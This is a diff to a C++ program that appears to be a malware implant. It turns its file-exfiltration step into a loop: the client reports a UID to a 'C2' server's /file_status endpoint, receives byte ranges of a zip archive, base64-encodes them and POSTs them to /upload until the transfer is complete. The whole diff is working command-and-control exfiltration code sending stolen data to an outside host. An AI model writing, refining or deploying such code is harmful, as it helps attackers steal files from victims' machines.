@@ -94,35 +94,42 @@ int main() {
             }
         }
         uid = GetUIDFromFile(); // once profiler is called, uid file is created
-        // Check file status
-        std::wstring FileStatusURL = C2 + L"/file_status";
-        nlohmann::json UidJson = {{"uid", WStringToString(uid)}};
-        std::string FileStatusResp = SendData(L"POST", FileStatusURL, L"", UidJson, L"");
-        auto FileJSONResp = nlohmann::json::parse(FileStatusResp);
-        std::cout << "JSON response: " << FileJSONResp << std::endl;
 
-        // Read required bytes from the server's JSON response:
-        int start_byte = FileJSONResp["start_byte"]; 
-        int end_byte = FileJSONResp["end_byte"];
+        // As long as the file upload status is incomplete, keep uploading bytes
+        do {
+            // Check file status
+            std::wstring FileStatusURL = C2 + L"/file_status";
+            nlohmann::json UidJson = { {"uid", WStringToString(uid)} };
+            std::string FileStatusResp = SendData(L"POST", FileStatusURL, L"", UidJson, L"");
+            auto FileJSONResp = nlohmann::json::parse(FileStatusResp);
 
-        // Grab the required bytes from start to end and encode them into base64
-        std::vector<char> requiredBytes = RetReqBytes(zipDestStr, start_byte, end_byte); 
-        std::string base64Encoded = EncodeBase64(std::string(requiredBytes.begin(), requiredBytes.end()));
+            if (!(FileJSONResp.contains("status") && FileJSONResp["status"] == "incomplete")) {
+                break;
+            }
 
-        // Construct a JSON object that contains the encoded file bytes and the client's UID:
-        nlohmann::json EncodedBytes; 
-        EncodedBytes["file_data"] = base64Encoded;
-        EncodedBytes["uid"] = WStringToString(uid);
+            std::cout << "JSON response: " << FileJSONResp << std::endl;
 
-        // Upload the requested bytes to the server:
-        std::wstring FileUploadURL = C2 + L"/upload";
-        std::string FilerResponse = SendData(L"POST", FileUploadURL, L"", EncodedBytes, L"");
-        std::cout << "JSON response for /upload: " << FilerResponse << std::endl;
+            // Read required bytes from the server's JSON response:
+            int start_byte = FileJSONResp["start_byte"];
+            int end_byte = FileJSONResp["end_byte"];
 
-        // Check file status after the first bytes upload:
-        std::string SecondFileCheck = SendData(L"POST", FileStatusURL, L"", UidJson, L""); 
-        auto SecondJSON = nlohmann::json::parse(SecondFileCheck);
-        std::cout << "JSON response: " << SecondJSON << std::endl;
+            // Grab the required bytes from start to end and encode them into base64
+            std::vector<char> requiredBytes = RetReqBytes(zipDestStr, start_byte, end_byte);
+            std::string base64Encoded = EncodeBase64(std::string(requiredBytes.begin(), requiredBytes.end()));
+
+            // Construct a JSON object that contains the encoded file bytes and the client's UID:
+            nlohmann::json EncodedBytes;
+            EncodedBytes["file_data"] = base64Encoded;
+            EncodedBytes["uid"] = WStringToString(uid);
+
+            // Upload the requested bytes to the server:
+            std::wstring FileUploadURL = C2 + L"/upload";
+            std::string FilerResponse = SendData(L"POST", FileUploadURL, L"", EncodedBytes, L"");
+            std::cout << "JSON response for /upload: " << FilerResponse << std::endl;
+
+        } while (true);
+
+        std::cout << "File upload has been completed." << std::endl;
     }
 
     return 0;
